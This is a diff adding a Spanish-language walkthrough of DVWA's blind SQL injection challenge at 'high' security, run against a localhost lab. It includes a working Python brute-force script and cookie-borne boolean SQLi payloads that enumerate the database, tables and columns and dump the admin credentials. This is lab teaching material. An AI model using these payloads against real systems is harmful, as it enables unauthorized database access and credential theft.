@@ -1274,5 +1274,188 @@ Por lo que ya sabemos que es vulnerable, y procederemos a enumerar el nombre de 
 
 `1' AND (SELECT SUBSTRING(database(),1,1))='a' -- -`
 
-Y esta consulta la adaptaremos a nuestro script ya conocido.
+Y esta consulta la adaptaremos a nuestro script ya conocido, cambiando obviamente algunas cosas:
 
+```py
+
+#!/usr/bin/python3
+
+from pwn import *
+import requests, signal, time, pdb, sys, string
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+#CTRL+C
+signal.signal(signal.SIGINT, def_handler)
+
+main_url = "http://localhost/DVWA/vulnerabilities/sqli_blind/"
+characters = string.ascii_lowercase + string.digits + "-_:@!$%&()*+/;<=>?[\]^{|}.~"
+
+def makeRequest():
+    
+    database = ""
+
+    p1 = log.progress("Enumerar base de datos")
+    p1.status("Iniciando ataque de fuerza bruta para enumerar el nombre de la base de datos actual")
+
+    time.sleep(2)
+
+    p2 = log.progress("database name")
+
+    for position in range(1,51):
+
+        for character in characters:
+
+            cookies = {
+                    'id': "1' AND (SELECT SUBSTRING(database(),%d,1))='%s' -- -" % (position, character),
+                    'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
+                    'security': "high"
+                    }
+            
+            p1.status(cookies['id'])
+
+            r = requests.get(main_url, cookies=cookies)
+
+            if "User ID exists in the database." in r.text:
+                database += character
+                p2.status(database)
+                break
+
+if __name__ == '__main__':
+
+    makeRequest()
+
+```
+
+Lo que hicimos fue eliminar los diccionarios que solo ocupabamos en peticiones POST, pero esta al ser GET, y la vulnerabilidad esta en las cookies cambiamos esos valores así:
+
+```py
+
+cookies = {
+	'id': "1' AND (SELECT SUBSTRING(database(),%d,1))='%s' -- -" % (position, character),
+	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
+	'security': "high"
+	}
+
+```
+
+Podemos apreciar que hemos agregado la consulta adaptada a python para fuzzear las posiciones, seguido de los demas valores de la cookie.
+
+Y en esta linea tramitamos y guardamos el resultado de la petición por el metodo GET, usando las cookies que asignamos.
+
+```py
+r = requests.get(main_url, cookies=cookies)
+```
+
+En este nivel no es necesario usar lo de hexadecimal ya que al parecer no se esta usando ese filtro.
+
+Al ejecutar el script veremos el nombre de la base de datos:
+
+![database](/assets/images/DVWA-SQLi/SQLiBlind-hard/database.png)
+
+Podemos ver que el nombre es "dvwa".
+
+Después crearemos una consulta que obtenga las tablas de esa base de datos:
+
+`1' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema='dvwa' limit 1)='a' -- -`
+
+Y la adaptamos al script:
+
+```py
+
+cookies = {
+	'id': "1' AND (SELECT SUBSTRING(table_name,%d,1) FROM information_schema.tables WHERE table_schema='dvwa' limit 1)='%s' -- -" % (position, character),
+	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
+	'security': "high"
+	}
+
+```
+
+Y vemos que nos responde el nombre de la primera tabla:
+
+![tablename](/assets/images/DVWA-SQLi/SQLiBlind-hard/tablename.png)
+
+Y también la segunda:
+
+![guestbook](/assets/images/DVWA-SQLi/SQLiBlind-hard/guestbook.png)
+
+<br>
+
+Ahora enumeraremos las columnas de la tabla users, quedando así la consulta que usaremos:
+
+`1' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' limit 1)='a' -- -`
+
+Y la adaptaremos al script:
+
+```py
+
+cookies = {
+	'id': "1' AND (SELECT SUBSTRING(column_name,%d,1) FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' limit 1)='%s' -- -" % (position, character),
+	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
+	'security': "high"
+	}
+
+```
+
+Y vemos que al ejecutarla nos da la columna user_id:
+
+![user_id](/assets/images/DVWA-SQLi/SQLiBlind-hard/user_id.png)
+
+Y jugando con el limit descubrimos las columnas:
+
+- user_id
+- first_name
+- last_name
+- user
+- password
+- avatar
+- last_login
+- failed_login
+
+Por lo que nos interesa enumerar el contenido de las columnas **user** y **password**, como ya hicimos en niveles anteriores, vamos a dumpear estos datos.
+
+Para ello usamos la siguiente consulta:
+
+`1' AND (SELECT SUBSTRING(user,1,1) FROM dvwa.users limit 1)='a'`
+
+Y la adaptaremos al script:
+
+```py
+
+cookies = {
+	'id': "1' AND (SELECT SUBSTRING(user,%d,1) FROM dvwa.users limit 1)='%s'" % (position, character),
+	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
+	'security': "high"
+	}
+
+```
+
+Y veremos que el primer registro usuario es:
+
+![admin](/assets/images/DVWA-SQLi/SQLiBlind-hard/admin.png)
+
+Podemos ver que es **admin**.
+
+Ahora enumeraremos la password de ese usuario:
+
+`1' AND (SELECT SUBSTRING(password,1,1) FROM dvwa.users WHERE user='admin' limit 1)='a'`
+
+Y la adaptaremos al script:
+
+```py
+
+cookies = {
+	'id': "1' AND (SELECT SUBSTRING(password,%d,1) FROM dvwa.users WHERE user='admin' limit 1)='%s'" % (position, character),
+	'PHPSESSID': "665toq56i3mfultm4gdbktb2os",
+	'security': "high"
+	}
+
+```
+
+Y vemos que nos responde:
+
+![password](/assets/images/DVWA-SQLi/SQLiBlind-hard/password.png)
+
+Y ya tendremos la password del usuario admin y hemos acabado con todos los niveles de DVWA.
